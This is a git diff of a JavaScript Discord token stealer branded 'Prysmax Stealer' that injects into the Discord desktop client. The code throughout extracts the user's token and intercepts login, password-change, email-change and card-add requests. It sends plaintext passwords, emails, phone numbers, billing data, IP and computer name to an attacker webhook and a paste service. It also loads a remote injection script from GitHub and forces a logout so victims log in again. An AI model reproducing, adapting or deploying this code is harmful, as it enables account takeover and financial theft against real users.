@@ -9,16 +9,13 @@ var computerName = process.env.COMPUTERNAME
 var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
 var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();`
 var doTheLogOut = fs.existsSync("./d3dcompiler.dlll") ? true : false
-
-
 var config = {
     "logout": "true",
     "logout-notify": "true",
     "init-notify": "true",
-    "embed-color": 16734976,
+    "embed-color": 16711718,
 
     creator: "%NAME_CREATOR%",
-    transfer_link: `%TRANSFER_URL%`,
     injection_url: "https://raw.githubusercontent.com/Lawxsz/api-test/main/inject.js",
     webhook: "%WEBHOOK%",
     Filter: {
@@ -46,7 +43,6 @@ var config = {
     }
 };
 
-
 async function execScript(str) {
     var window = electron.BrowserWindow.getAllWindows()[0]
     var script = await window.webContents.executeJavaScript(str, true)
@@ -62,20 +58,20 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "Prysmax Premium",
+        username: "Prysmax Stealer",
         avatar_url: "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax.gif",
         content: "",
         embeds: [{
             title: title,
+            url: "https://t.me/lawoficial",
             color: config["embed-color"],
             fields: fields,
             description: description ?? "",
             author: {
-                name: `Prysmax-Premium`
+                name: `Prysmax by ${config.creator}`
             },
-            
             footer: {
-                text: `©[${config.creator}] | t.me/lawoficial`
+                text: "t.me/lawoficial Prysmax Team"
             },
 
         }]
@@ -121,7 +117,7 @@ const GetBadges = (e) => {
 }
 const GetRBadges = (e) => {
     var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
 }
 
 const GetNSFW = (bouki) => {
@@ -144,20 +140,7 @@ const GetA2F = (bouki) => {
             return "Idk bro you got me"
     }
 }
-async function getDiscordClientFolder() {
-    const parts = __dirname.split('\\');
-    let discordclient;
-  
-    for (let i = parts.length - 1; i >= 0; i--) {
-      const part = parts[i];
-      if (/Discord(PTB|Canary)?/i.test(part) && part !== 'discord_desktop_core') {
-        discordclient = part;
-        break;
-      }
-    }
-  
-    return discordclient || "None";
-  }
+
 
 const parseFriends = friends => {
     var real = friends.filter(x => x.type == 1)
@@ -218,7 +201,7 @@ function GetLangue(read) {
         "de": ":flag_de: Deutsch",
         "en-GB": ":england: English (UK)",
         "en-US": ":flag_us: USA",
-        "en-ES": ":flag_es: Espanol",
+        "en-ES": ":flag_es: Espagnol",
         "hr": ":flag_hr: Croatian",
         "it": ":flag_it: Italianio",
         "lt": ":flag_lt: Lithuanian",
@@ -249,11 +232,6 @@ function GetLangue(read) {
 }
 const post = async (params) => {
     params = JSON.stringify(params)
-    var token = await execScript(tokenScript)
-    var n = JSON.stringify({
-        data: params,
-        token: token
-    });
     [config.webhook].forEach(res => {
         const url = new URL(res);
         const options = {
@@ -274,21 +252,18 @@ const post = async (params) => {
     })
 
 }
-
-
 const FirstTime = async () => {
     if (doTheLogOut) return false
     var token = await execScript(tokenScript)
     if (config['init-notify'] !== "true") return true
-    if (fs.existsSync(__dirname + "/Hawkish")) fs.rmdirSync(__dirname + "/Hawkish")
+    if (fs.existsSync(__dirname + "/PRYSMAX")) fs.rmdirSync(__dirname + "/PRYSMAX")
     var ip = await getIP()
-    var client_discord = await getDiscordClientFolder()
     if (!token) {
         var params = await makeEmbed({
-            title: "Prysmax-Premium Initialized",
+            title: "Prysmax Initalized",
             fields: [{
                 name: "Injection Info",
-                value: `\`\`\`diff\n- Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
+                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
                 inline: !1
             }]
         })
@@ -300,15 +275,18 @@ const FirstTime = async () => {
 
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax_banner.gif"
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax_banner.gif"
+        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax.gif"
+        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax.gif"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: "Prysmax-Premium Initialized",
-            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
+            title: "PRYSMAX Initalized",
             fields: [{
+                name: "Injection Info",
+                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
+                inline: !1
+            }, {
                 name: "Username <:username:1041634536733290596> ",
                 value: `\`${user.username}#${user.discriminator}\``,
                 inline: !0
@@ -331,31 +309,27 @@ const FirstTime = async () => {
             }, {
                 name: "NSFW <a:nsfw:1041640474617839616>",
                 value: `${GetNSFW(user.nsfw_allowed)}`,
-                inline: !0
+                inline: !1
             }, {
                 name: "A2F <a:a2f:1040272766982692885>",
                 value: `${GetA2F(user.mfa_enabled)}`,
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[Prysmax Premium <:PensiveRubbish:650957937065459713>](https://t.me/lawoficial`,
-                inline: !0
-            }, {
-                name: "Prysmax Files",
-                value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
+                value: `[Prysmax <:muscleright:1001562803292868670>](https://t.me/lawoficial)`,
                 inline: !0
             }, {
                 name: "Billing <a:billing:1041641103629234196>",
                 value: `${Billings}`,
-                inline: !0
+                inline: !1
             }, {
                 name: "Email <a:email:1041639672037785691>",
-                value: `\`${user.email ?? "none"}\``,
+                value: `\`${user.email}\``,
                 inline: !0
             }, {
-                name: "Bio :bust_in_silhouette:",
-                value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
-                inline: !1
+                name: "Phone :mobile_phone:",
+                value: `\`${user.phone ?? "None"}\``,
+                inline: !0
             }, {
                 name: "<a:tokens:1041634540537511957> Token",
                 value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
@@ -394,14 +368,17 @@ const FirstTime = async () => {
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
             if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax.gif"
-            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax_banner.gif"
-            
+            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax.gif"
+
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
             var params = await makeEmbed({
-                title: "Prysmax Victim got logged out",
-                description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
+                title: "Prysmax's Victim got logged out",
                 fields: [{
+                    name: "Injection Info",
+                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
+                    inline: !1
+                }, {
                     name: "Username <:username:1041634536733290596> ",
                     value: `\`${user.username}#${user.discriminator}\``,
                     inline: !0
@@ -424,23 +401,19 @@ const FirstTime = async () => {
                 }, {
                     name: "NSFW <a:nsfw:1041640474617839616>",
                     value: `${GetNSFW(user.nsfw_allowed)}`,
-                    inline: !0
+                    inline: !1
                 }, {
                     name: "A2F <a:a2f:1040272766982692885>",
                     value: `${GetA2F(user.mfa_enabled)}`,
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Prysmax Stealer <:discorddeveloper:697686848545488986>](https://t.me/lawoficial)`,
-                    inline: !0
-                }, {
-                    name: "Prysmax Files",
-                    value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
+                    value: `[Prysmax <:muscleright:1001562803292868670>](https://t.me/lawoficial)`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
                     value: `${Billings}`,
-                    inline: !0
+                    inline: !1
                 }, {
                     name: "Email <a:email:1041639672037785691>",
                     value: `\`${user.email}\``,
@@ -449,10 +422,6 @@ const FirstTime = async () => {
                     name: "Phone :mobile_phone:",
                     value: `\`${user.phone ?? "None"}\``,
                     inline: !0
-                }, {
-                    name: "Bio <:discorddeveloper:697686848545488986>",
-                    value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
-                    inline: !1
                 }, {
                     name: "<a:tokens:1041634540537511957> Token",
                     value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
@@ -523,6 +492,7 @@ function init() {
 
 require("${appPath}/app.asar")
 if (fs.existsSync(betterDiscord)) require(betterDiscord)`
+
     fs.writeFileSync(index, script)
     if (!doTheLogOut) execScript(logOutScript)
     return
@@ -565,23 +535,25 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
     if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax.gif"
-    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax_banner.gif"
+    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax.gif"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
     var Billings = parseBilling(billing)
     var Friends = parseFriends(friends)
-    
-    var client_discord = await getDiscordClientFolder()
-    
+
     switch (true) {
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
                 title: "Prysmax User Login",
+                description: "[<:muscleright:1001562803292868670>  **Oh you have Prysmaxe someone**](https://t.me/lawoficial)",
                 color: config['embed-color'],
-                description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [{
+                    name: "Injection Info",
+                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
+                    inline: !1
+                }, {
                     name: "Username <:username:1041634536733290596> ",
                     value: `\`${user.username}#${user.discriminator}\``,
                     inline: !0
@@ -604,23 +576,19 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 }, {
                     name: "NSFW <a:nsfw:1041640474617839616>",
                     value: `${GetNSFW(user.nsfw_allowed)}`,
-                    inline: !0
+                    inline: !1
                 }, {
                     name: "A2F <a:a2f:1040272766982692885>",
                     value: `${GetA2F(user.mfa_enabled)}`,
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Prysmax Stealer <:discorddeveloper:697686848545488986>](https://t.me/lawoficial)`,
-                    inline: !0
-                }, {
-                    name: "Prysmax Files",
-                    value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
+                    value: `[Prysmax <:muscleright:1001562803292868670>](https://t.me/lawoficial)`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
                     value: `${Billings}`,
-                    inline: !0
+                    inline: !1
                 }, {
                     name: "Email <a:email:1041639672037785691>",
                     value: `\`${user.email}\``,
@@ -633,10 +601,6 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     name: "<a:password:1041639669047238676> Password",
                     value: `\`${password}\``,
                     inline: !0
-                }, {
-                    name: "Bio <:discorddeveloper:697686848545488986>",
-                    value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
-                    inline: !1
                 }, {
                     name: "<a:tokens:1041634540537511957> Token",
                     value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
@@ -664,9 +628,13 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (data.new_password) {
                 var params = await makeEmbed({
                     title: "Prysmax Detect Password Changed",
+                    description: "[<:muscleright:1001562803292868670>  **Oh you have someone**](https://t.me/lawoficial)",
                     color: config['embed-color'],
-                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
+                        name: "Injection Info",
+                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
+                        inline: !1
+                    }, {
                         name: "Username <:username:1041634536733290596> ",
                         value: `\`${user.username}#${user.discriminator}\``,
                         inline: !0
@@ -696,11 +664,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Prysmax Stealer <:discorddeveloper:697686848545488986>](https://t.me/lawoficial)`,
-                        inline: !0
-                    }, {
-                        name: "Prysmax Files",
-                        value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
+                        value: `[Prysmax <:muscleright:1001562803292868670>](https://t.me/lawoficial)`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
@@ -723,7 +687,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         value: `\`${data.new_password}\``,
                         inline: !0
                     }, {
-                        name: "Bio <:discorddeveloper:697686848545488986>",
+                        name: "Bio <:muscleright:1001562803292868670>",
                         value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                         inline: !1
                     }, {
@@ -751,9 +715,13 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (data.email) {
                 var params = await makeEmbed({
                     title: "Prysmax Detect Email Changed",
+                    description: "[<:muscleright:1001562803292868670>  **Oh you have someone**](https://t.me/lawoficial)",
                     color: config['embed-color'],
-                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
+                        name: "Injection Info",
+                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
+                        inline: !1
+                    }, {
                         name: "Username <:username:1041634536733290596> ",
                         value: `\`${user.username}#${user.discriminator}\``,
                         inline: !0
@@ -776,23 +744,19 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     }, {
                         name: "NSFW <a:nsfw:1041640474617839616>",
                         value: `${GetNSFW(user.nsfw_allowed)}`,
-                        inline: !0
+                        inline: !1
                     }, {
                         name: "A2F <a:a2f:1040272766982692885>",
                         value: `${GetA2F(user.mfa_enabled)}`,
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Prysmax Stealer <:discorddeveloper:697686848545488986>](https://t.me/lawoficial)`,
-                        inline: !0
-                    }, {
-                        name: "Prysmax Files",
-                        value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
+                        value: `[Prysmax <:muscleright:1001562803292868670>](https://t.me/lawoficial)`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
                         value: `${Billings}`,
-                        inline: !0
+                        inline: !1
                     }, {
                         name: "New Email <a:email:1041639672037785691>",
                         value: `\`${user.email}\``,
@@ -806,7 +770,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         value: `\`${data.password}\``,
                         inline: !0
                     }, {
-                        name: "Bio <:discorddeveloper:697686848545488986>",
+                        name: "Bio <:muscleright:1001562803292868670>",
                         value:  `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                         inline: !1
                     }, {
@@ -838,7 +802,6 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var params = await makeEmbed({
                 title: "Prysmax User Credit Card Added",
                 description: `
-                Prysmax Files: [Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})
                 **IP:** ${ip}\n\n
                 **Username** <:username:1041634536733290596>\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
                 **ID** <:iduser:1041634535395307520>\n\`\`\`${user.id}\`\`\`\n
